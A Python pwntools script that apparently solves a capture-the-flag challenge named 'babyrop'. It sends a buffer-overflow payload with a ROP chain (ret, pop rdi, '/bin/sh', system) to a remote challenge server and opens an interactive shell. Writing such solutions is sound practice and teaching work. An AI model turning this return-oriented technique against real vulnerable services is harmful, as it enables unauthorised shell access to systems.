from pwn import *

SERVER = "challs1.nusgreyhats.org"
PORT = 5012

# p = process('./babyrop')
p = remote(SERVER, PORT)

elf = ELF('./babyrop')

# ROPgadget --binary babyrop | grep 'pop rdi'
# 0x0000000000400683 : pop rdi ; ret
poprdi = 0x400683

# ROPgadget --binary babyrop | grep 'ret'
# 0x0000000000400486 : ret
ret = 0x400486

system_addr = elf.plt.system

favorite_shell = next(elf.search(b'/bin/sh'))
# favorite_shell = 0x4006a4

buf = b'a'*(32 + 8)

# goal: call system(favourite_shell)
payload = buf + p64(ret) + p64(poprdi) + p64(favorite_shell) + p64(system_addr)

## Attach debugger
# gdb.attach(p)
# pause()

p.sendline(payload)
p.interactive()
